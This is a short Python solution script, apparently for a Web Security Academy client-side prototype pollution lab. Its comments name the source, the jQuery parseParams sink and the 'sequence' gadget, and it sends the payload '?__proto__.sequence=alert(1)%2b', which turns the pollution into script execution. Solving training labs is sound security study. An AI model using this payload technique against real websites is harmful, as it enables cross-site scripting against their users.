from web_security_academy.core.logger import logger

# Source:   `window.location`
# Sink:     `$.parseParams` function defined in `/resources/js/jquery_parseparams.js`
# Gadget:   `sequence` property of `manager` variable defined in
#           `/resources/js/searchLoggerAlternative.js`


def solve_lab(session):
    path = "?__proto__.sequence=alert(1)%2b"
    logger.info(f"Visiting `{path}`...")
    session.get_path(path)
